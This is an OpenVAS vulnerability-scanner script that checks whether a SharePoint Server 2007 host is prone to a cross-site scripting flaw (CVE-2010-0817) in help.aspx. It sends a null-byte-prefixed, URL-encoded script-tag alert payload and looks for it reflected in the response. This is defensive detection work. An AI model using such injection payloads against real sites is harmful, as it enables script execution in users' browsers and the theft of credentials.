###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_sharepoint_39776.nasl 11987 2018-10-19 11:05:52Z mmartin $
#
# Microsoft SharePoint Server 2007 '_layouts/help.aspx' Cross Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103254");
  script_version("$Revision: 11987 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 13:05:52 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-09-14 13:31:57 +0200 (Wed, 14 Sep 2011)");
  script_bugtraq_id(39776);
  script_cve_id("CVE-2010-0817");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_name("Microsoft SharePoint Server 2007 '_layouts/help.aspx' Cross Site Scripting Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39776");
  script_xref(name:"URL", value:"http://blogs.technet.com/msrc/archive/2010/04/29/security-advisory-983438-released.aspx");
  script_xref(name:"URL", value:"http://office.microsoft.com/en-us/sharepointserver/FX100492001033.aspx");
  script_xref(name:"URL", value:"http://www.htbridge.ch/advisory/xss_in_microsoft_sharepoint_server_2007.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/511021");
  script_xref(name:"URL", value:"http://support.avaya.com/css/P8/documents/100089744");
  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/advisory/983438.mspx");
  script_xref(name:"URL", value:"http://www.microsoft.com/technet/security/Bulletin/MS10-039.mspx");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sharepoint/banner");
  script_tag(name:"solution", value:"The vendor has released an advisory and updates. Please see the
references for details.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Microsoft SharePoint Server 2007 and SharePoint Services 3.0 are prone
to a cross-site scripting vulnerability because they fail to properly
sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and to launch other attacks.");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_asp(port:port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "sharepoint" >!< tolower(banner))exit(0);

url = string("/_layouts/help.aspx?cid0=MS.WSS.manifest.xml%00%3Cscript%3Ealert%28%27OpenVAS-XSS-Test%27%29%3C/script%3E&tid=X");

if(http_vuln_check(port:port, url:url,pattern:"<script>alert\('OpenVAS-XSS-Test'\)</script><br/>",check_header:TRUE)) {
  security_message(port:port);
  exit(0);
}

exit(0);
